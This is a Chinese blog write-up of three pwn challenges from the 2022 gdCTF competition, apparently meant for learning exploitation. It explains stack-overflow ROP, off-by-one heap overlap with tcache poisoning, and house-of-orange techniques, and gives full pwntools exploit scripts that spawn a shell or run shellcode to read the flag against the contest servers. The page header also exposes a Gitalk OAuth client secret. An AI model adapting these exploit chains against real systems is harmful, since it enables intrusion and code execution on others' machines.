<!DOCTYPE html><html lang="zh-CN" theme="light"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Csome"><title>[2022gdCTF]jmp_rsp midpwn easyheap WP · Csome</title><meta name="description" content="jmp_rsp题目https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip
解题思路直接一把梭，写入ROP，在bss上写shellcode即可
EXP1234567891011121314151617181920"><meta name="keywords" content="Blog,博客,Hexo,Csome,CSOME"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta id="site_data_static" data-url="/"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/js_complied/bundle.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&amp;display=swap" rel="stylesheet"><script src="/js_complied/bundle.js"></script><script>Anatolo.comment.setConfig({"valine":{"enable":false,"appid":null,"appkey":null,"notify":false,"verify":false,"avatar":"mm","placeholder":"hello, world"},"gitment":{"enable":false,"owner":"Your GitHub ID","repo":"Repo to store comments","client_id":"Your client ID","client_secret":"Your client secret"},"gitalk":{"enable":true,"owner":"csomepro","repo":"blogComment","client_id":"7d6a77c3aaf8c1731f93","client_secret":"bdcc0b620d6bc922d81a3f92d3ecf0ecb1c8feee"},"duoshuo":null,"disqus":null,"gentie":null})</script><link rel="stylesheet" href="/css/comments/gittalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><meta name="generator" content="Hexo 8.1.0"></head><body> <main-outlet><div class="page-top animated"><div class="nav"><li><a href="/">首页</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li><li><a href="/about">关于</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li class="btn-toggle-more"><i class="fa fa-ellipsis"></i></li><li class="btn-go-back"><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li class="btn-search"><a class="fa fa-search" onclick="Anatolo.search.openWindow();"></a></li><li class="btn-toggle-theme"><a class="far fa-sun" onclick="Anatolo.darkLightToggle();"></a></li></div><div class="avatar"><img src="/images/Csome2.webp"></div></div></div><div class="toc-mobile"><div class="toc-button"><span>目录</span></div><div class="toc-container in-page animated fadeInDown"><div class="toclist-container"><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#jmp-rsp"><span class="toclist-text">jmp_rsp</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toclist-text">解题思路</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EXP"><span class="toclist-text">EXP</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#midpwn"><span class="toclist-text">midpwn</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toclist-text">解题思路</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toclist-text">完整EXP</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#easyheap"><span class="toclist-text">easyheap</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toclist-text">解题思路</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Exp"><span class="toclist-text">Exp</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%85%B6%E4%BB%96"><span class="toclist-text">其他</span></a></li></ol></li></ol></div></div></div></div><div class="sidebar animated"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/Csome2.webp" style="width:200px;" alt="favicon"><h3 title=""><a href="/">Csome</a></h3><div class="description"><p>「算法」✔「CTF」✔「编曲」✔「唱歌」×</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/CsomePro"><i class="fab fa-github"></i></a></li><li><a href="mailto:csome@m.scnu.edu.cn"><i class="fa fa-envelope"></i></a></li></ul></div><div class="toc-container in-sidebar animated fadeInDown"><details class="ltr" open><summary>目录</summary><div class="toclist-container"><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#jmp-rsp"><span class="toclist-text">jmp_rsp</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toclist-text">解题思路</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EXP"><span class="toclist-text">EXP</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#midpwn"><span class="toclist-text">midpwn</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toclist-text">解题思路</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toclist-text">完整EXP</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#easyheap"><span class="toclist-text">easyheap</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toclist-text">解题思路</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Exp"><span class="toclist-text">Exp</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%85%B6%E4%BB%96"><span class="toclist-text">其他</span></a></li></ol></li></ol></div></div></details></div></div><div class="footer"><div class="p"><span>全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Csome</span></div><div class="by_farbox"><span>Powered by</span><a href="https://hexo.io/zh-cn/" target="_blank"> Hexo</a><span> &</span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank"> Anatolo</a></div><div class="beian"></div></div></div><div class="main animated fadeInDown"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated"><div class="post-title"><h3><a>[2022gdCTF]jmp_rsp midpwn easyheap WP</a></h3></div><div class="post-content"><p><h1 id="jmp-rsp"><a href="#jmp-rsp" class="headerlink" title="jmp_rsp"></a>jmp_rsp</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a target="_blank" rel="noopener" href="https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接一把梭，写入ROP，在bss上写shellcode即可</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./jmp_rsp&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;47.106.122.102&#x27;</span>, <span class="number">44071</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./jmp_rsp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;x86_64&#x27;</span>)</span><br><span class="line">shell_code = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400696</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000410173</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000449395</span></span><br><span class="line">vuln_buf = <span class="number">0x00000006B9144</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(vuln_buf) + p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(vuln_buf)</span><br><span class="line">io.sendline(p)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">io.sendline(shell_code)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="midpwn"><a href="#midpwn" class="headerlink" title="midpwn"></a>midpwn</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><a target="_blank" rel="noopener" href="https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/midpwn.zip">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/midpwn.zip</a></p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>逆向分析发现，开了沙箱，需要利用orw进行文件内容泄露</p>
<p><img src="/p/2022gdCTF-pwn/image-20220523085903003.png" alt="image-20220523085903003"></p>
<p>通过逆向分析发现edit函数存在off by one的漏洞</p>
<p><img src="/p/2022gdCTF-pwn/image-20220523090433714.png" alt="image-20220523090433714"></p>
<p>最后的思路就是，通过off by one修改下一个堆块的size位置，构造堆块堆叠，接下来主要控制tacache bin的fd指针构造任意位置分配读写。</p>
<p>能够实现任意位置读写之后，构造堆块进入unsortedbin，泄露main_arena的地址，从而泄露libc_base，通过偏移量算出environ的地址（libc地址中存放着environ变量，中存放着栈地址），再次构造堆块，分配到environ上面，泄露栈地址，最后，malloc执行的位置是在add函数，通过计算偏移修改add函数返回地址，写入ROP。</p>
<p>有关ROP的构造，实验发现mmap只需要前4个参数为addr、size、7、34即可分配出一个可执行的目标地址。</p>
<p>故构造ROP，分配一个0x23330000的地址作为写入shellcode的地址，最后调用<code>read(0,0x23330000,0x50)</code>写入orw</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a, b, c, d</span>):</span><br><span class="line">    pp = p64(pop_rdi) + p64(a)</span><br><span class="line">    pp += p64(pop_rsi) + p64(b)</span><br><span class="line">    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> pp</span><br><span class="line">p = func(<span class="number">0x23330000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, <span class="number">34</span>) + p64(libc.sym[<span class="string">&#x27;mmap&#x27;</span>])</span><br><span class="line">p += func(<span class="number">0</span>, <span class="number">0x23330000</span>, <span class="number">0x50</span>, <span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">p += p64(<span class="number">0x23330000</span>)</span><br></pre></td></tr></table></figure>

<p>有关ORW的构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sc = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>))</span><br><span class="line">sc += asm(shellcraft.read(<span class="number">6</span>, <span class="number">0x23330000</span> + <span class="number">0x300</span>, <span class="number">0x30</span>))</span><br><span class="line">sc += asm(shellcraft.write(<span class="number">1</span>, <span class="number">0x23330000</span> + <span class="number">0x300</span>, <span class="number">0x30</span>))</span><br></pre></td></tr></table></figure>

<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># getIO = lambda : process([&#x27;./ld-2.31.so&#x27;, &#x27;./orz&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class="line">getIO = <span class="keyword">lambda</span> : remote(<span class="string">&#x27;120.79.220.233&#x27;</span>, <span class="number">45715</span>)</span><br><span class="line">sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">io = getIO()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choose which one?\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;please input note size : &#x27;</span>, <span class="built_in">str</span>(size)) </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;please input your note.\n&#x27;</span>, content) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">size, content</span>): </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choose which one?\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;please input note size : &#x27;</span>, <span class="built_in">str</span>(size)) </span><br><span class="line">    io.sendafter(<span class="string">&#x27;please input your note.\n&#x27;</span>, content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>): </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choose which one?\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;please input note index.\n&#x27;</span>, <span class="built_in">str</span>(idx)) </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;please input new note.\n&#x27;</span>, content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>): </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choose which one?\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;please input note index.\n&#x27;</span>, <span class="built_in">str</span>(idx)) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>): </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choose which one?\n&#x27;</span>, <span class="string">&#x27;4&#x27;</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;please input note index.\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">stack_offset = <span class="number">0x120</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0xb0</span>, <span class="string">&#x27;aaaaaa&#x27;</span>) <span class="comment"># 1 ~ 10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xb0</span>, <span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">add2(<span class="number">0xb0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - (<span class="number">0x7f3a3e885d61</span> - <span class="number">0x7f3a3e699000</span> )</span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">environ = <span class="number">0x01EF600</span> + libc_base </span><br><span class="line">log.success(<span class="string">&#x27;environ:&#x27;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0xb0</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 11 vuln</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 12 edit</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 13</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 15</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">&#x27;a&#x27;</span> *<span class="number">0x28</span>+<span class="string">&#x27;\xc1&#x27;</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, <span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 17</span></span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x31</span>)+p64(environ-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 13</span></span><br><span class="line">add2(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 17</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">17</span>)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">stack_base = u64(io.recv(<span class="number">8</span>)) <span class="comment"># - 0x1f438 </span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;stack_base:&#x27;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b72</span> + libc_base</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002604f</span></span><br><span class="line">pop_rdx_rcx_rbx = libc_base + <span class="number">0x00000000001025ad</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a, b, c, d</span>):</span><br><span class="line">    pp = p64(pop_rdi) + p64(a)</span><br><span class="line">    pp += p64(pop_rsi) + p64(b)</span><br><span class="line">    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> pp</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line">flag_path = <span class="string">&#x27;/home/pwn/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">flag_path_addr = stack_base + <span class="number">0x150</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 19</span></span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">edit(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x31</span>)+p64(flag_path_addr))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 13</span></span><br><span class="line">add2(<span class="number">0x28</span>, flag_path) <span class="comment"># 18</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xc1</span>))</span><br><span class="line">add(<span class="number">0xb0</span>, <span class="string">&#x27;aaaaa&#x27;</span>) <span class="comment"># 19</span></span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">add_ret =  stack_base - stack_offset</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xc1</span>) + p64(add_ret))</span><br><span class="line">add(<span class="number">0xb0</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 13</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = func(<span class="number">0x23330000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, <span class="number">34</span>) + p64(libc.sym[<span class="string">&#x27;mmap&#x27;</span>])</span><br><span class="line">p += func(<span class="number">0</span>, <span class="number">0x23330000</span>, <span class="number">0x50</span>, <span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">p += p64(<span class="number">0x23330000</span>)</span><br><span class="line">log.success(<span class="string">&#x27;len:&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(p)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb0</span>, p)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> sc == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    sc = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>))</span><br><span class="line">    sc += asm(shellcraft.read(<span class="number">6</span>, <span class="number">0x23330000</span> + <span class="number">0x300</span>, <span class="number">0x30</span>))</span><br><span class="line">    sc += asm(shellcraft.write(<span class="number">1</span>, <span class="number">0x23330000</span> + <span class="number">0x300</span>, <span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line">io.send(sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>

<h1 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p><a target="_blank" rel="noopener" href="https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/easyheap.zip">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/easyheap.zip</a></p>
<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>主要漏洞在，v3局部变量可能未初始化，可以提前布置栈帧，达到任意位置写入堆地址</p>
<p><img src="/p/2022gdCTF-pwn/image-20220524094853062.png" alt="image-20220524094853062"></p>
<p>以及还有一个backdoor函数，可以堆上任意写8字节（虽然只有一次，但利用上边的漏洞可以无限次）</p>
<p>利用house of orange，修改_IO_2_stdout_，泄露libc_base，再次利用泄露environ地址，栈地址，heap基址</p>
<p>之后利用修改tcachebin上的fd指针，参考midpwn的解法，修改add函数的返回地址，写入orw ROP，获得flag</p>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 